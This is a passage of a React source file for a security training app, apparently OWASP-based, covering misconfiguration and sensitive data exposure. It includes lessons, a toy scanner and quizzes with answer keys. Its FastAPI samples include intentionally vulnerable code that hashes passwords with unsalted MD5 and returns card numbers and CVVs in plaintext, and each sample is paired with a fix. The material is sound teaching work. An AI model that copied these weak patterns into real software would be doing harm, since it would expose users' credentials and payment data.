                <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-orange-400 mb-2">🪵 Information Disclosure</h4>
                  <p className="text-sm text-slate-300">Debug traces reveal internals that speed up further attacks</p>
                </div>
                <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-yellow-400 mb-2">🔓 Unauthorized Admin Access</h4>
                  <p className="text-sm text-slate-300">Missing auth on internal routes hands over full control</p>
                </div>
                <div className="bg-purple-900/20 border border-purple-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-purple-400 mb-2">🎯 Faster Exploitation</h4>
                  <p className="text-sm text-slate-300">Version fingerprinting lets attackers target known CVEs directly</p>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Shield className="w-6 h-6 text-green-400" />
                3. How to Fix It - Best Known Methods
              </h3>
              <div className="flex gap-2 mb-4 bg-slate-700/50 p-2 rounded-lg">
                <button onClick={() => setCodeView('comparison')} className={`flex-1 px-4 py-2 rounded-lg transition-all ${codeView === 'comparison' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'}`}>Before/After Comparison</button>
                <button onClick={() => setCodeView('sidebyside')} className={`flex-1 px-4 py-2 rounded-lg transition-all ${codeView === 'sidebyside' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'}`}>Side-by-Side View</button>
              </div>
              {codeView === 'comparison' ? (
                <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4 mb-4">
                  <PythonCode code={comparisonCode} />
                </div>
              ) : (
                <div className="grid md:grid-cols-2 gap-4 mb-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-red-400 mb-3">❌ BEFORE:</h4>
                    <PythonCode code={vulnerableCode} />
                  </div>
                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-green-400 mb-3">✅ AFTER:</h4>
                    <PythonCode code={secureCode} />
                  </div>
                </div>
              )}
              <div className="bg-slate-700/50 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-green-400">Hardening Checklist:</h4>
                <ul className="space-y-2 text-sm text-slate-300">
                  <li>• <strong>Disable Debug in Production:</strong> Tie it to an environment variable, never a hardcoded True</li>
                  <li>• <strong>Explicit CORS Allowlist:</strong> Name the exact trusted origins, methods, and headers</li>
                  <li>• <strong>Authenticate Every Internal Route:</strong> Including diagnostics, health checks with sensitive data, and admin tools</li>
                  <li>• <strong>Change Every Default:</strong> Credentials, sample data, and default accounts before going live</li>
                  <li>• <strong>Automate Config Review:</strong> Bake these checks into CI/CD so they can't silently regress</li>
                </ul>
              </div>
            </div>

            <button onClick={() => { setActiveTab('lab'); onSectionComplete('learn'); }} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700">
              Continue to Interactive Lab →
            </button>
          </div>
        )}

        {activeTab === 'lab' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4">🧪 Interactive Lab: Configuration Scanner</h3>
              <p className="text-slate-300 mb-4">Toggle these settings to match a real deployment, then scan for issues.</p>

              <div className="space-y-3 bg-slate-900 rounded-lg p-6">
                <label className="flex items-center justify-between">
                  <span>Debug Mode</span>
                  <button onClick={() => setDebugMode(!debugMode)} className={`px-4 py-1 rounded-full font-bold text-sm ${debugMode ? 'bg-red-600' : 'bg-green-600'}`}>{debugMode ? 'ON (risky)' : 'OFF'}</button>
                </label>
                <label className="flex items-center justify-between">
                  <span>CORS Origins</span>
                  <button onClick={() => setWildcardCors(!wildcardCors)} className={`px-4 py-1 rounded-full font-bold text-sm ${wildcardCors ? 'bg-red-600' : 'bg-green-600'}`}>{wildcardCors ? '* (risky)' : 'Allowlisted'}</button>
                </label>
                <label className="flex items-center justify-between">
                  <span>Admin Route Authentication</span>
                  <button onClick={() => setAdminAuth(!adminAuth)} className={`px-4 py-1 rounded-full font-bold text-sm ${!adminAuth ? 'bg-red-600' : 'bg-green-600'}`}>{adminAuth ? 'Required' : 'None (risky)'}</button>
                </label>
                <label className="flex items-center justify-between">
                  <span>Default Credentials Changed</span>
                  <button onClick={() => setDefaultCreds(!defaultCreds)} className={`px-4 py-1 rounded-full font-bold text-sm ${defaultCreds ? 'bg-red-600' : 'bg-green-600'}`}>{defaultCreds ? 'No (risky)' : 'Yes'}</button>
                </label>
              </div>

              <button onClick={runScan} className="w-full mt-4 bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-bold">Scan Configuration</button>

              {scanResult && (
                <div className={`mt-4 rounded-lg p-4 border ${scanResult.safe ? 'bg-green-900/20 border-green-500/50' : 'bg-red-900/20 border-red-500/50'}`}>
                  {scanResult.safe ? (
                    <p className="font-bold text-green-400">✅ No misconfigurations found - this is a hardened configuration.</p>
                  ) : (
                    <>
                      <p className="font-bold text-red-400 mb-2">⚠️ {scanResult.findings.length} issue(s) found:</p>
                      <ul className="space-y-2 text-sm text-slate-300">
                        {scanResult.findings.map((f, i) => (
                          <li key={i}><span className={`font-semibold ${f.severity === 'Critical' ? 'text-red-400' : 'text-orange-400'}`}>[{f.severity}]</span> {f.text}</li>
                        ))}
                      </ul>
                    </>
                  )}
                </div>
              )}

              <button onClick={() => { setActiveTab('quiz'); onSectionComplete('lab'); }} className="w-full mt-6 bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700">
                Ready for the Quiz? →
              </button>
            </div>
          </div>
        )}

        {activeTab === 'quiz' && (
          <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
            <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <Trophy className="w-6 h-6 text-yellow-400" />
              Knowledge Check Quiz
            </h3>
            <Quiz questions={quizQuestions} onComplete={() => onSectionComplete('quiz')} />
          </div>
        )}
      </div>
    </div>
  );
};


// ============================================================================
// SENSITIVE DATA EXPOSURE MODULE
// ============================================================================

const SensitiveDataModule = ({ onBack, onSectionComplete, completedSections }) => {
  const [activeTab, setActiveTab] = useState('learn');
  const [codeView, setCodeView] = useState('comparison');
  const [passwordHash, setPasswordHash] = useState('md5');
  const [transport, setTransport] = useState('http');
  const [cardStorage, setCardStorage] = useState('plaintext');
  const [logging, setLogging] = useState('full');
  const [scanResult, setScanResult] = useState(null);

  const vulnerableCode = `from fastapi import FastAPI
import hashlib

app = FastAPI()

@app.post("/register")
async def register(username: str, password: str):
    """⚠️ VULNERABLE - Weak hashing, no salt"""
    # DANGEROUS: MD5 is fast and crackable via rainbow tables, and
    # no per-user salt means identical passwords produce identical hashes
    password_hash = hashlib.md5(password.encode()).hexdigest()
    save_user(username, password_hash)
    return {"message": "Registered"}

@app.get("/users/{user_id}/card")
async def get_card(user_id: int):
    # DANGEROUS: full card number and CVV returned in plaintext,
    # and logged in plaintext by every proxy/access log along the way
    card = get_stored_card(user_id)
    return {"card_number": card.number, "cvv": card.cvv}`;

  const secureCode = `from fastapi import FastAPI
from passlib.hash import argon2

app = FastAPI()

@app.post("/register")
async def register(username: str, password: str):
    """✅ SECURE - Strong adaptive hashing"""
    # SAFE: Argon2 is deliberately slow and automatically salts each hash
    password_hash = argon2.hash(password)
    save_user(username, password_hash)
    return {"message": "Registered"}

@app.get("/users/{user_id}/card")
async def get_card(user_id: int):
    """✅ SECURE - Only exposes a masked reference"""
    card = get_stored_card(user_id)  # stored encrypted at rest

    # SAFE: CVV is never stored after initial authorization, and only
    # the last 4 digits of the card are ever returned to the client
    return {"card_last4": card.number[-4:], "brand": card.brand}`;

  const comparisonCode = `from fastapi import FastAPI
from passlib.hash import argon2

app = FastAPI()

@app.post("/register")
async def register(username: str, password: str):
    """✅ SECURE - Strong adaptive hashing"""

    # ❌ OLD (VULNERABLE): fast, unsalted, easily-cracked hash
    # password_hash = hashlib.md5(password.encode()).hexdigest()

    # ✅ NEW (SECURE): slow-by-design, auto-salted hash
    password_hash = argon2.hash(password)
    save_user(username, password_hash)
    return {"message": "Registered"}

@app.get("/users/{user_id}/card")
async def get_card(user_id: int):
    card = get_stored_card(user_id)

    # ❌ OLD (VULNERABLE): full card number + CVV returned in plaintext
    # return {"card_number": card.number, "cvv": card.cvv}

    # ✅ NEW (SECURE): only a masked reference is ever exposed
    return {"card_last4": card.number[-4:], "brand": card.brand}`;

  const quizQuestions = [
    {
      id: 1,
      question: "Why is MD5 (even with a salt) inappropriate for password hashing today?",
      options: [
        "MD5 produces hashes that are too long",
        "MD5 is designed to be fast, letting attackers try billions of guesses per second on modern hardware - password hashing needs to be deliberately slow",
        "MD5 isn't compatible with FastAPI",
        "MD5 requires a paid license"
      ],
      correct: 1,
      explanation: "Password hashing algorithms like Argon2, bcrypt, and PBKDF2 are intentionally slow and tunable, making brute-force attacks impractical even with powerful hardware - MD5 has neither property."
    },
    {
      id: 2,
      question: "What's the key difference between hashing and encryption for protecting sensitive data?",
      options: [
        "They're the same thing with different names",
        "Hashing is one-way (for verification, e.g. passwords); encryption is reversible with a key (for data you need back, e.g. card numbers)",
        "Encryption is always weaker than hashing",
        "Hashing requires a network connection"
      ],
      correct: 1,
      explanation: "You never need to recover a plaintext password - you only need to verify a guess against a hash. Card numbers, by contrast, sometimes need to be retrieved, so they require reversible encryption, not hashing."
    },
    {
      id: 3,
      question: "Why shouldn't a CVV ever be stored after the initial transaction?",
      options: [
        "It takes up too much database space",
        "PCI-DSS prohibits storing CVV post-authorization, since it exists only to prove card-present intent at the moment of purchase",
        "CVVs change every day",
        "It's fine to store it as long as it's in a different table"
      ],
      correct: 1,
      explanation: "Storing the CVV defeats its entire purpose and multiplies the impact of any future breach - payment industry standards explicitly forbid retaining it after authorization."
    },
    {
      id: 4,
      question: "What's a simple but often-overlooked place sensitive data leaks?",
      options: [
        "The application's own database",
        "Application/access logs and URLs (query strings), which are frequently less protected and retained longer than the primary database",
        "The user's own device",
        "It never leaks anywhere else"
      ],
      correct: 1,
      explanation: "Logs and proxies often capture full request URLs and bodies by default, and are retained far longer (and guarded far less carefully) than the primary datastore."
    }
  ];

  const runScan = () => {
    const findings = [];
    if (passwordHash === 'md5') findings.push({ severity: 'Critical', text: 'Passwords are hashed with MD5 - fast, unsalted, and crackable in seconds with modern hardware or rainbow tables.' });
    if (transport === 'http') findings.push({ severity: 'Critical', text: 'Sensitive data is transmitted over plain HTTP - trivially intercepted on shared networks via packet sniffing.' });
    if (cardStorage === 'plaintext') findings.push({ severity: 'Critical', text: 'Full card numbers (and CVV) are stored in plaintext - a single leak exposes everything in immediately usable form.' });
    if (logging === 'full') findings.push({ severity: 'High', text: 'Full sensitive data is written to application logs - logs are often retained longer and protected less than the primary database.' });

    setScanResult({ safe: findings.length === 0, findings });
    onSectionComplete('lab');
  };

  const progressPercent = (Object.keys(completedSections).length / 3) * 100;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white p-8">
      <div className="max-w-6xl mx-auto">
        <button onClick={onBack} className="flex items-center gap-2 mb-6 text-slate-400 hover:text-white transition-all">
          <Home className="w-5 h-5" /> Back to Modules
        </button>

        <div className="mb-6">
          <div className="flex items-center gap-3 mb-4">
            <EyeOff className="w-10 h-10 text-indigo-400" />
            <h1 className="text-4xl font-bold">Sensitive Data Exposure</h1>
          </div>
          <div className="bg-slate-800 rounded-lg p-4">
            <div className="flex justify-between items-center mb-2">
              <span className="text-sm text-slate-400">Module Progress</span>
              <span className="text-sm font-bold text-purple-400">{Math.round(progressPercent)}%</span>
            </div>
            <div className="w-full bg-slate-700 rounded-full h-2">
              <div className="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full transition-all duration-500" style={{ width: `${progressPercent}%` }} />
            </div>
          </div>
        </div>

        <div className="flex gap-2 mb-6 bg-slate-800/50 p-2 rounded-lg">
          {[
            { id: 'learn', label: 'Learn', icon: BookOpen },
            { id: 'lab', label: 'Interactive Lab', icon: Terminal },
            { id: 'quiz', label: 'Quiz', icon: Trophy }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg transition-all ${
                activeTab === tab.id ? 'bg-purple-600 text-white shadow-lg' : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'
              }`}
            >
              <tab.icon className="w-5 h-5" />
              {tab.label}
              {completedSections[tab.id] && <CheckCircle className="w-4 h-4 text-green-400" />}
            </button>
          ))}
        </div>

        {activeTab === 'learn' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Code className="w-6 h-6 text-purple-400" />
                1. Understanding the Vulnerability
              </h3>
              <p className="text-slate-300 mb-4">
                Sensitive data exposure happens when data that should be protected - passwords, payment details, personal information -
                is handled with weak cryptography, transmitted unencrypted, stored in plaintext, or logged in the clear. Often no single
                mistake causes a breach; the accumulation of shortcuts does.
              </p>

              <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-red-400 mb-2">❌ Vulnerable Code Example:</h4>
                <PythonCode code={vulnerableCode} />
              </div>

              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold mb-3">Common Failures - Try Toggling These in the Lab:</h4>
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-slate-700">
                        <th className="text-left p-2 text-purple-400">Failure</th>
                        <th className="text-left p-2 text-purple-400">Example</th>
                        <th className="text-left p-2 text-purple-400">Impact</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Weak Password Hashing</td>
                        <td className="p-2 text-slate-300">MD5/SHA1 with no per-user salt</td>
                        <td className="p-2 text-slate-300">Cracked almost instantly if the database ever leaks</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Plaintext Storage</td>
                        <td className="p-2 text-slate-300">Full card numbers/SSNs stored as-is in the database</td>
                        <td className="p-2 text-slate-300">One SQL injection or backup leak exposes everything</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-orange-400">Unencrypted Transport</td>
                        <td className="p-2 text-slate-300">Sensitive data sent over HTTP instead of HTTPS</td>
                        <td className="p-2 text-slate-300">Trivially intercepted on shared/public networks</td>
                      </tr>
                      <tr>
                        <td className="p-2 font-semibold text-orange-400">Logged in Plaintext</td>
                        <td className="p-2 text-slate-300">Full card numbers or tokens written to access logs</td>
                        <td className="p-2 text-slate-300">Logs become a second, often less-protected copy of the secret</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <AlertCircle className="w-6 h-6 text-orange-400" />
                2. Why This Matters - Real-World Impact
              </h3>
              <div className="grid md:grid-cols-2 gap-4">
                <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-red-400 mb-2">🗝️ Mass Credential Leak</h4>
                  <p className="text-sm text-slate-300">Cracked passwords enable credential-stuffing attacks elsewhere</p>
                </div>
                <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-orange-400 mb-2">💳 PCI-DSS Violations</h4>
                  <p className="text-sm text-slate-300">Improper card data handling brings fines and lost processing rights</p>
                </div>
                <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-yellow-400 mb-2">⚖️ Regulatory Exposure</h4>
                  <p className="text-sm text-slate-300">GDPR/CCPA penalties for mishandling personal data</p>
                </div>
                <div className="bg-purple-900/20 border border-purple-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-purple-400 mb-2">🕰️ Long-Tail Exposure</h4>
                  <p className="text-sm text-slate-300">Data lingers in logs/backups long after the primary fix ships</p>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Shield className="w-6 h-6 text-green-400" />
                3. How to Fix It - Best Known Methods
              </h3>
              <div className="flex gap-2 mb-4 bg-slate-700/50 p-2 rounded-lg">
                <button onClick={() => setCodeView('comparison')} className={`flex-1 px-4 py-2 rounded-lg transition-all ${codeView === 'comparison' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'}`}>Before/After Comparison</button>
                <button onClick={() => setCodeView('sidebyside')} className={`flex-1 px-4 py-2 rounded-lg transition-all ${codeView === 'sidebyside' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'}`}>Side-by-Side View</button>
              </div>
              {codeView === 'comparison' ? (
                <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4 mb-4">
                  <PythonCode code={comparisonCode} />
                </div>
              ) : (
                <div className="grid md:grid-cols-2 gap-4 mb-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-red-400 mb-3">❌ BEFORE:</h4>
                    <PythonCode code={vulnerableCode} />
                  </div>
                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-green-400 mb-3">✅ AFTER:</h4>
                    <PythonCode code={secureCode} />
                  </div>
                </div>
              )}
              <div className="bg-slate-700/50 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-green-400">Data Protection Checklist:</h4>
                <ul className="space-y-2 text-sm text-slate-300">
                  <li>• <strong>Adaptive Password Hashing:</strong> Argon2, bcrypt, or PBKDF2 - never MD5/SHA1</li>
                  <li>• <strong>Encrypt Sensitive Fields at Rest:</strong> Card numbers, SSNs, and similar with a managed key</li>
                  <li>• <strong>HTTPS Everywhere:</strong> No sensitive data ever travels over plain HTTP</li>
                  <li>• <strong>Store Only What You Need:</strong> Never retain CVVs; truncate/mask card numbers in responses</li>
                  <li>• <strong>Redact Logs:</strong> Strip or mask sensitive fields before anything is written to logs</li>
                </ul>
              </div>
            </div>

            <button onClick={() => { setActiveTab('lab'); onSectionComplete('learn'); }} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700">
              Continue to Interactive Lab →
            </button>
          </div>
        )}

        {activeTab === 'lab' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4">🧪 Interactive Lab: Data Exposure Scanner</h3>
              <p className="text-slate-300 mb-4">Toggle these design decisions to match a real system, then scan for issues.</p>

              <div className="space-y-3 bg-slate-900 rounded-lg p-6">
                <label className="flex items-center justify-between">
                  <span>Password Hashing</span>
                  <button onClick={() => setPasswordHash(passwordHash === 'md5' ? 'argon2' : 'md5')} className={`px-4 py-1 rounded-full font-bold text-sm ${passwordHash === 'md5' ? 'bg-red-600' : 'bg-green-600'}`}>{passwordHash === 'md5' ? 'MD5 (risky)' : 'Argon2'}</button>
                </label>
                <label className="flex items-center justify-between">
                  <span>Transport</span>
                  <button onClick={() => setTransport(transport === 'http' ? 'https' : 'http')} className={`px-4 py-1 rounded-full font-bold text-sm ${transport === 'http' ? 'bg-red-600' : 'bg-green-600'}`}>{transport === 'http' ? 'HTTP (risky)' : 'HTTPS'}</button>
                </label>
                <label className="flex items-center justify-between">
                  <span>Card Storage</span>
                  <button onClick={() => setCardStorage(cardStorage === 'plaintext' ? 'encrypted' : 'plaintext')} className={`px-4 py-1 rounded-full font-bold text-sm ${cardStorage === 'plaintext' ? 'bg-red-600' : 'bg-green-600'}`}>{cardStorage === 'plaintext' ? 'Plaintext (risky)' : 'Encrypted + Truncated'}</button>
                </label>
                <label className="flex items-center justify-between">
                  <span>Logging</span>
                  <button onClick={() => setLogging(logging === 'full' ? 'redacted' : 'full')} className={`px-4 py-1 rounded-full font-bold text-sm ${logging === 'full' ? 'bg-red-600' : 'bg-green-600'}`}>{logging === 'full' ? 'Full Data (risky)' : 'Redacted'}</button>
                </label>
              </div>

              <button onClick={runScan} className="w-full mt-4 bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-bold">Scan Configuration</button>

              {scanResult && (
                <div className={`mt-4 rounded-lg p-4 border ${scanResult.safe ? 'bg-green-900/20 border-green-500/50' : 'bg-red-900/20 border-red-500/50'}`}>
                  {scanResult.safe ? (
                    <p className="font-bold text-green-400">✅ No sensitive data exposure risks found in this configuration.</p>
                  ) : (
                    <>
                      <p className="font-bold text-red-400 mb-2">⚠️ {scanResult.findings.length} issue(s) found:</p>
                      <ul className="space-y-2 text-sm text-slate-300">
                        {scanResult.findings.map((f, i) => (
                          <li key={i}><span className={`font-semibold ${f.severity === 'Critical' ? 'text-red-400' : 'text-orange-400'}`}>[{f.severity}]</span> {f.text}</li>
                        ))}
                      </ul>
                    </>
                  )}
                </div>
              )}

              <button onClick={() => { setActiveTab('quiz'); onSectionComplete('lab'); }} className="w-full mt-6 bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700">
                Ready for the Quiz? →
              </button>
            </div>
          </div>
        )}

        {activeTab === 'quiz' && (
          <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
            <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <Trophy className="w-6 h-6 text-yellow-400" />
              Knowledge Check Quiz
            </h3>
            <Quiz questions={quizQuestions} onComplete={() => onSectionComplete('quiz')} />
          </div>
        )}
      </div>
    </div>
  );
};


export default OWASPSecurityTutorial;